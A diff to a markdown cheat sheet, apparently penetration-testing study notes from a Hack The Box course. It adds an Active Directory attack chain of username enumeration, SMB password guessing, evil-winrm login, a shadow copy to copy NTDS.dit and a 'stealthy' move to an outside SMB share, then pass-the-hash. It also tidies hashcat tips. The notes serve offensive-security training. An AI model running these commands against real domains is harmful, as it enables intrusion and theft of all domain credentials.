@@ -294,6 +294,43 @@
 
 ```
 
+<br>
+
+### Active Directory 
+```
+# automated list generator
+    1. https://github.com/urbanadventurer/username-anarchy
+    2. ~/tools/username-anarchy
+    3. sudo ./username-anarchy -i ~/htb/cert/temp/usernames.txt > ~/htb/cert/temp/usernamesmixed.txt
+
+# Enumerate Valid Usernames 
+    1. kerbrute
+    2. ~/tools/kerbrute 
+    3. ./kerbrute_linux_amd64 userenum --dc [ip] --domain [domain] username.txt
+
+# Dictionary attacks using netexec 
+    1. netexec smb ip -u username -p /password/list
+
+
+# After creds are found, try and retrieve the NTDS.dit file. Stores all domain usernames, and password hashes. Use secretsdump and netexec to dump and crack creds. 
+
+# Connect to remote DC using the creds you jsut found and evilwinrm 
+    1. evil-winrm -i 10.129.201.57 -u username -p password
+    2. Check priv with the following command. We are looking for an acc with admin rights 
+        2a. net localgroup 
+    3. Check domain privileges 
+        3a. net user bwilliamson
+    4. Since we have admin rights we can use vssadmin to create a VSS of the Drive 
+        4a. vssadmin CREATE SHADOW /For=Drive Letter 
+    5. Copy the file to another directory 
+        5a. cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+    6. Refer back to the "Attacking SAM, SYSTEM, & SECURITY" sections for creating an SMB share. It's a stealthy way to move files off of the DC 
+    7. Transfer the files 
+        7a. cmd.exe /c move C:\NTDS\NTDS.dit \\ip\CompData
+    8. Follow "Attacking SAM, SYSTEM, & SECURITY"
+    9. You can still use hashes in a pass-the-hash-attack. 
+    9a. evil-winrm -i ip -u username -H hash
+```
 
 
 
@@ -337,6 +374,6 @@ End
 
 ## Additional Notes & Tips
 
-- 💡 Use `hashcat -I` to list supported GPUs and hash‑modes before cracking.
-- 🔑 Combine `rockyou.txt` with custom rules like `best64.rule` for quick wins.
-- 🛠️ After cracking, feed credentials into `sprayingtoolkit` to test lateral movement.
+- Use `hashcat -I` to list supported GPUs and hash‑modes before cracking.
+- Combine `rockyou.txt` with custom rules like `best64.rule` for quick wins.
+- After cracking, feed credentials into `sprayingtoolkit` to test lateral movement.
